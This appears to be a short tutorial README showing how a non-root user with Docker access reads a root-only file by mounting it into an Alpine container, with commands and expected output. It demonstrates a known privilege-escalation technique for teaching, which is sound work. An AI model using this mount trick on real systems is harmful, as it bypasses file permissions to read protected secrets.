# Privilege Escalation Using Docker Containers

## Prerequisites

- [Docker](https://docs.docker.com/engine/install/)

## Quick Start

1. Create a new file as the `root` user.

    ```bash
    su - # login as root
    echo "supersecret" > secret.txt
    ```

2. List files and read `secret.txt` content as root.

    ```bash
    # list files in current directory
    ls -lhr
    total 8.0K
    -rw-r--r-- 1 root   root     12 Jan 17 23:14 secret.txt
    # show content of file
    cat secret.txt 
    supersecret
    ```

3. Using a regular user (non-root) account try to display the content of the `secret.txt` file.

    ```bash
    cat secret.txt
    cat: secret.txt: Permission denied
    ```

4. Using a regular user (non-root) account run a docker container and mount the `secret.txt` file to read the content.

    ```bash
    docker run -v "$(pwd)/secret.txt:/tmp/secret.txt" -it alpine sh -c "cat /tmp/secret.txt"
    supersecret
    ```

5. Inspect who's running the docker container using the `ps` command.

    ```bash
    # using a regular user account run the following
    docker run -it alpine sh -c "sleep 3600"
    # in a different terminal run the ps command
    docker ps -a
    # replace $CONTAINER_ID for the actual container id
    ps -aux | grep $CONTAINER_ID
    # stop the alpine container
    docker stop $CONTAINER_ID
    ```

## Resouces

- <https://kind.sigs.k8s.io/docs/user/configuration/>
